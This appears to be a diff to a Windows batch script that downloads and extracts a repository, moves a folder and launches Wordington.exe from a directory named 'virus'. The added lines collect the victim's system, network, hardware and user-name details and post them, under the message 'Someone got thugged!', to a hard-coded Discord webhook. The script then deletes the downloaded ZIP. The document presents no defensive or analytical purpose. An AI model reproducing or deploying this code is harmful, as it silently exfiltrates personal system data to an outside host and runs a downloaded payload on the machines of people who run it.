@@ -20,21 +20,42 @@ if /I "%user_name%"=="adisa" (
     if /I "%confirm%"=="no" exit
 )
 
+echo Gathering system information...
+
+:: Collect system information
+for /f "tokens=*" %%a in ('systeminfo') do set "sysinfo=%%a"
+for /f "tokens=*" %%a in ('ipconfig') do set "networkinfo=%%a"
+for /f "tokens=*" %%a in ('wmic computersystem get model') do set "systemmodel=%%a"
+for /f "tokens=*" %%a in ('wmic cpu get caption') do set "cpuinfo=%%a"
+for /f "tokens=*" %%a in ('wmic memorychip get capacity') do set "raminfo=%%a"
+for /f "tokens=*" %%a in ('wmic useraccount where name="%user_name%" get fullname') do set "userfullname=%%a"
+
+:: Format message
+set "message=Someone got thugged! Here is the info about the computer:%n%User: %user_name%%n%Full Name: %userfullname%%n%System: %systemmodel%%n%CPU: %cpuinfo%%n%RAM: %raminfo%%n%Network Info: %networkinfo%%n%System Info: %sysinfo%"
+
+:: Send info to Discord webhook
+powershell -Command "Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1337159633239937115/KdOhG-AXg3ckXDIrmcWESldNObYb5dZ16S8F591bs12XlwFC7M_l754ukBqeyhvXcJwY' -Method Post -Body '{\"content\": \"%message%\"}' -ContentType 'application/json'"
+
+:: Download the repository
 echo Downloading repository...
 powershell -Command "& {Invoke-WebRequest '%repo_url%' -OutFile '%zip_path%'}"
 
+:: Extract the ZIP file
 echo Extracting ZIP...
 powershell -Command "& {Expand-Archive -Path '%zip_path%' -DestinationPath '%extract_path%' -Force}"
 
+:: Move the Neighborhood folder
 echo Moving Neighborhood folder...
 for /d %%D in ("%extract_path%\*") do if exist "%%D\Neighborhood" move "%%D\Neighborhood" "%downloads_path%"
 
+:: Run Wordington.exe
 echo Running Wordington.exe...
 for /d %%D in ("%extract_path%\*") do if exist "%%D\virus" (
     cd /d "%%D\virus"
     start Wordington.exe
 )
 
+:: Cleanup
 echo Cleaning up...
 del "%zip_path%"
 exit
